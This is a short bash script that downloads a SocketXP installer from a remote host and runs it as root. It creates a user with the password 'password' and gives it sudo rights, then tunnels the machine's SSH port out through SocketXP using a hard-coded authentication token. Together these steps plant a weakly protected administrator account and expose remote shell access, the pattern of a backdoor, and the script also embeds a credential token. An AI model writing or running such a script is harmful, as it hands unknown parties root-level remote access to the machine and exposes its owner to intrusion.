!/bin/bash
curl -O https://portal.socketxp.com/download/iot/socketxp_install.sh && chmod +wx socketxp_install.sh && sudo ./socketxp_install.sh -a "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjI2MDUyNjA2NDksImtleSI6IjcxZTI0NmI4LTRmM2QtNGYwMS04ZTMyLTY1ZDQ1NGNmNzc2OSJ9.ifPUH7n2rnMwkcnfxHJYisngTobilpfKIB1HueMMw9k"

sudo useradd -p $(openssl passwd -1 password) testtest

usermod -aG sudo testtest

socketxp login eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjI2MDUyNjA2NDksImtleSI6IjcxZTI0NmI4LTRmM2QtNGYwMS04ZTMyLTY1ZDQ1NGNmNzc2OSJ9.ifPUH7n2rnMwkcnfxHJYisngTobilpfKIB1HueMMw9k

socketxp connect tcp://localhost:22 &


